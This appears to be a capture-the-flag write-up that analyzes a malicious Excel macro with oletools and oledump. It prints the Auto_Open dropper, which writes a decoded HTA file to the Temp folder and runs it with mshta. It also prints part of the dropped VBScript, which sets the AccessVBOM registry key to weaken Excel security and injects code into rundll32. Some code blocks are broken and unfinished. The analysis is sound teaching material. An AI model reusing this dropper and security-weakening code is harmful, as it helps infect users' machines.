# üÜò Hands-on analyzing VBA macros

What is VBA? First of all, VB is Visual Basic, ‚Äúan object-oriented programming language developed by Microsoft. Using Visual Basic makes it fast and easy to create type-safe .NET apps‚Äù. [Link](https://learn.microsoft.com/en-us/dotnet/visual-basic/)

VBA means Visual Basic for Application, it‚Äôs used to develope a macro in Office documents like Word or Excel. [Link](https://learn.microsoft.com/en-us/office/vba/api/overview/)

Therefore, hackers are likely to take its advantages to create malicious functions to infect our devices. [Link](https://learn.microsoft.com/en-us/microsoft-365/security/intelligence/macro-malware?view=o365-worldwide)

Talking about history, Concept Virus was the first macro virus that targeted Microsoft Word, appeared in 1995.

Nowadays, Microsoft has released a patch that disable macro by default when user downloads a document from Internet in July 2022.

## Overview

In Capture The Flag challenges, they often give us Word or Excel documents, some will be in Office family like RTF file, PowerPoint, etc. So what tools and techniques do we use to analyze them?

I usually use `oletools`, and `oledump` to extract the macro. Most importantly, you should prepare a virtual environment like Windows virtual machine for sandbox analyzing. I‚Äôm using highly modified Windows 10 with Flare VM installed.

## Intro the challenge <a href="#obfsc4t10n" id="obfsc4t10n"></a>

The challenge give us an invoice html file.

<figure><img src=".gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

You can press the download button or simply open an editor and extract the base64 string in it then decode to a file.

The file‚Äôs extension is `xlsm` which means it‚Äôs an excel file with macro enabled. You can see the list of extensions here.

## Analyst

Let‚Äôs use olevba to extract the macro‚Äôs source code. Actually, there are many ways to extract the macro‚Äôs content. You can use the combination of Alt + F11 to view VBA window when in an Office file like Word or Excel.\


<figure><img src=".gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

We will use oledump to extract the structure of the macro.

The streams starting with "VBA/" contain the actual VBA code for different modules in the workbook, such as "Module1," "Sheet1," and "ThisWorkbook." These modules may contain macros or other VBA code that perform specific actions when the Excel file is opened or used.

Next step, use olevba to extract macro in files

Empty macro in "Sheet1" and "ThisWorkbook"&#x20;

    fHdswUyK = "msh" & "ta " & GgyYKuJh

End Sub
```

Damn, what a long source code!

And here is the analysis output of olevba

<figure><img src=".gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

In the source code lies two extremely suspicious functions that was obfuscated. They‚Äôre just normal base64 encode and decode process. How do I know? Just guessing based on output of olevba and some of signatures in `LeOyoqoF` and `hdYJNJmt` function.

Jumping to `Auto_Open` function which is our main target, we can see how this macro works.

```vba
Sub Auto_Open()
    Dim fHdswUyK, GgyYKuJh
    Application.Goto ("JLprrpFr")
    GgyYKuJh = Environ("temp") & "\LwTHLrGh.hta"
    
    Open GgyYKuJh For Output As #1
    Write #1, hdYJNJmt(ActiveSheet.Shapes(2).AlternativeText & UZdcUQeJ.yTJtzjKX & Selection)
    Close #1
    
    fHdswUyK = "msh" & "ta " & GgyYKuJh
    x = Shell(fHdswUyK, 1)
End Sub
```

VBA macros can automatically run itself by Auto\_Open or Workbook\_Open events. These both can execute by opening the excel files manually and click `Enable Content` button.

[https://www.pcreview.co.uk/threads/auto\_open-vs-workbook\_open.953960/](https://www.pcreview.co.uk/threads/auto\_open-vs-workbook\_open.953960/)

Back to the macro, first it declares two variables are `fHdswUyK` and `GgyYKuJh`. Then it called `Application.Goto()` method. This will make the program to select `JLprrpFr` procedure [Link](https://learn.microsoft.com/en-us/office/vba/api/excel.application.goto).

`GgyYKuJh` is a string contain the path to Temp folder of current user in machine. `& "\LwTHLrGh.hta"` just concat the dest file to the path. Maybe this is the dropped file of the macro after its execution.

`ActiveSheet`

VBA object that refers to the currently active worksheet in an Excel workbook. In Excel, when you have multiple worksheets open, the active sheet is the one that is currently displayed on the screen and with which the user is interacting. VBA allows you to manipulate and access the data and properties of the active sheet using this object.

\
`AlternativeText`\
"AlternativeText" is a property that can be used in VBA to access or set the alternative text for certain objects or elements in Excel, such as shapes, pictures, or charts. Alternative text is primarily used for accessibility purposes, as it provides a description of the object's content to users who may not be able to view or interact with the visual content directly (e.g., people with visual impairments who use screen readers).

After that, the macro decode a base64 string in somewhere of the excel file and write it to the dropped file.

Last, execute the file by using **mshta**. The `Shell()` function will take this responsibility.

### Execute the macro

We will need (yes it is obligatory) a Windows VM for this. As I said before, I‚Äôm currently using Windows 10 virtual machine with Flare VM installed in it. You can use whatever you want but I recommend you to use at least version 7 or later. We have ver 11 for a long time, why use such an old OS (in case you have to :v).

If you don‚Äôt have Office in your VM, just install it then open the xlsm file. Enable the macro content and wait for the result. Here‚Äôs the video record of what I did:

{% embed url="https://www.youtube.com/watch?v=1fSET-gfU6E" %}

### Event log

Logging is one of the best thing that mankind have created.

Windows has a logging system called ‚Ä¶ with evtx files and a program to view it. You can use other parsers but just use the one from Micro$oft. You can do a parallel analysis with Event Log and chainsaw - a tools that extract suspicious content from evtx file based on rules (like Sigma or Yara).

Sometimes, you will need the event log for full-view about the attack. It can give you some clues about the impacts which macros have made in our systems.

\
// Logging after the macro executed?? Need something about evtx logs.



### Dropped file <a href="#dropped-file" id="dropped-file"></a>

Because we have already known the location of the dropped file after macro execution, we can look up that shitty and see what‚Äôs inside. Thanks fully that the macro didn‚Äôt delete it.

The file is hta which is html but with a program in it, it can be either VBScript or JScript.

```vba
<html><head><script language="vbscript">
Dim objExcel, WshShell, RegPath, action, objWorkbook, xlmodule

Set objExcel = CreateObject("Excel.Application")
objExcel.Visible = False

Set WshShell = CreateObject("Wscript.Shell")

function RegExists(regKey)
        on error resume next
        WshShell.RegRead regKey
        RegExists = (Err.number = 0)
end function

' Get the old AccessVBOM value
RegPath = "HKEY_CURRENT_USER\Software\Microsoft\Office\" & objExcel.Version & "\Excel\Security\AccessVBOM"

if RegExists(RegPath) then
        action = WshShell.RegRead(RegPath)
else
        action = ""
end if

' Weaken the target
WshShell.RegWrite RegPath, 1, "REG_DWORD"

This VBScript code is designed to run a hidden macro inside a Microsoft Excel workbook. It leverages a technique to weaken the security settings of Excel to allow the macro to execute successfully. The code then creates a new Excel workbook, adds a VBA macro to it, and executes that macro.&#x20;

1. **Setting Up Excel Application**: The code creates an instance of the Excel application using the "CreateObject" function and sets its visibility to "False," making the application run in the background (invisible to the user).
2.  **Checking and Modifying Registry Settings**: The code checks if a particular registry key related to Excel's security settings exists. The key is for allowing access to the VBOM (Visual Basic for Applications Object Model). If the key exists, its current value is stored in the "action" variable. If the key doesn't exist, "action" remains empty.

    After that, the code weakens the Excel security settings by setting the registry key "AccessVBOM" to 1, allowing VBA macros to access the VBOM. This change makes it possible to create and run VBA code dynamically.
3. **Creating a New Excel Workbook**: The code creates a new Excel workbook using "objExcel.Workbooks.Add()".
4. **Adding VBA Macro to the Workbook**: The code creates a new VBA module in the newly created workbook ("xlmodule") and adds a VBA code block to it. The VBA code is quite lengthy and appears to be obfuscated to avoid detection. The VBA code creates some custom types ("PROCESS\_INFORMATION" and "STARTUPINFO") and a function ("CreateStuff") which seems to have a remote thread creation capability.
5. **Running the Hidden Macro**: The code uses the "objExcel.Run" method to execute the "Auto\_Open" subroutine within the newly created workbook, which effectively runs the hidden macro.
6. **Closing and Quitting Excel**: After the macro execution, the code closes the newly created workbook without saving changes using "objWorkbook.Close False" and then quits the Excel application using "objExcel.Quit".
7. **Restoring Registry Settings**: Finally, the code checks if the "action" variable contains any value. If it does, it means that a previous "AccessVBOM" registry key setting existed before the macro ran. In that case, it restores the original value of the "AccessVBOM" registry key to its previous state. If "action" is empty, it means that the registry key didn't exist before running the macro, and the code deletes the "AccessVBOM" registry key to restore the original state.

In the provided VBA code, `rwxpage` is a variable used to store the address of the memory page that will be allocated in the target process (`rundll32.exe`) using the `AllocStuff` function. The name `rwxpage` appears to suggest that the memory page will be set with read, write, and execute permissions.

The data in the `myArray` is a set of integer values that have been encoded as decimal numbers using a simple encoding technique, likely to obfuscate the real purpose of the data.
